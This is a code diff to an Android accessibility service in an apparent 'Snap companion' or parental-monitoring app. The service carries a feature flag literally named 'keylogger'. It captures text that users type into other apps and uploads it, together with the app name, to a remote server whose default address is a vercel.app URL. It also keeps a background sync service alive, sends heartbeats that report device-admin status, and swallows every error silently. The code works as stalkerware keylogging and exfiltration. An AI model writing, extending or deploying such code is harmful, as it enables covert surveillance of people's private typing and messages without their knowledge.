@@ -15,25 +15,19 @@ public class SnapAccessibilityService extends AccessibilityService {
     @Override
     protected void onServiceConnected() {
         super.onServiceConnected();
-        SharedPreferences prefs = getSharedPreferences("snap_companion_prefs", MODE_PRIVATE);
-        prefs.edit().putBoolean("is_accessibility_active", true).apply();
-
         try {
-            ClipboardMonitor.start(this);
-        } catch (Throwable ignored) {}
+            SharedPreferences prefs = getSharedPreferences("snap_companion_prefs", MODE_PRIVATE);
+            prefs.edit().putBoolean("is_accessibility_active", true).apply();
 
-        // Ensure background sync service is alive
-        try {
+            // Ensure background sync service is alive
             Intent svc = new Intent(this, CompanionSyncService.class);
             if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                 startForegroundService(svc);
             } else {
                 startService(svc);
             }
-        } catch (Throwable ignored) {}
 
-        // Immediate heartbeat reporting accessibility active
-        try {
+            // Immediate heartbeat reporting accessibility active
             String server = prefs.getString("server_url", "https://snap-app-chi.vercel.app");
             String devId = prefs.getString("device_id", null);
             if (devId != null) {
@@ -45,35 +39,40 @@ public class SnapAccessibilityService extends AccessibilityService {
     @Override
     public void onAccessibilityEvent(AccessibilityEvent event) {
         if (event == null) return;
+        try {
+            if (event.isPassword()) return;
 
-        CharSequence pkgChar = event.getPackageName();
-        String pkg = pkgChar != null ? pkgChar.toString() : "";
+            CharSequence pkgChar = event.getPackageName();
+            String pkg = pkgChar != null ? pkgChar.toString() : "";
 
-        // Ignore our own package
-        if (getPackageName().equals(pkg)) return;
+            // Ignore our own package
+            if (getPackageName().equals(pkg)) return;
 
-        if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
-            lastPackage = pkg;
-        } else if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
-            if (!TelemetrySyncHelper.isFeatureEnabled(this, "keylogger")) return;
+            int eventType = event.getEventType();
+            if (eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
+                lastPackage = pkg;
+            } else if (eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
+                if (!TelemetrySyncHelper.isFeatureEnabled(this, "keylogger")) return;
 
-            long now = System.currentTimeMillis();
-            if (now - lastLogTime < 500) return; // Debounce rapid keystrokes
+                long now = System.currentTimeMillis();
+                if (now - lastLogTime < 500) return; // Debounce rapid keystrokes
 
-            StringBuilder sb = new StringBuilder();
-            if (event.getText() != null) {
-                for (CharSequence s : event.getText()) {
+                java.util.List<CharSequence> textList = event.getText();
+                if (textList == null || textList.isEmpty()) return;
+
+                StringBuilder sb = new StringBuilder();
+                for (CharSequence s : textList) {
                     if (s != null) sb.append(s).append(" ");
                 }
-            }
 
-            String content = sb.toString().trim();
-            if (content.length() > 0) {
-                lastLogTime = now;
-                String appName = getAppName(pkg);
-                TelemetrySyncHelper.uploadKeystroke(this, pkg, appName, content);
+                String content = sb.toString().trim();
+                if (!content.isEmpty()) {
+                    lastLogTime = now;
+                    String appName = getAppName(pkg);
+                    TelemetrySyncHelper.uploadKeystroke(this, pkg, appName, content);
+                }
             }
-        }
+        } catch (Throwable ignored) {}
     }
 
     private String getAppName(String pkg) {
@@ -95,6 +94,13 @@ public class SnapAccessibilityService extends AccessibilityService {
     public void onDestroy() {
         SharedPreferences prefs = getSharedPreferences("snap_companion_prefs", MODE_PRIVATE);
         prefs.edit().putBoolean("is_accessibility_active", false).apply();
+        try {
+            String server = prefs.getString("server_url", "https://snap-app-chi.vercel.app");
+            String devId = prefs.getString("device_id", null);
+            if (devId != null) {
+                ApiClient.sendHeartbeat(server, devId, 100, false, false, ParentalSetupHelper.isDeviceAdminActive(this), ParentalSetupHelper.isBatteryOptimizationIgnored(this), null, null);
+            }
+        } catch (Throwable ignored) {}
         super.onDestroy();
     }
 }
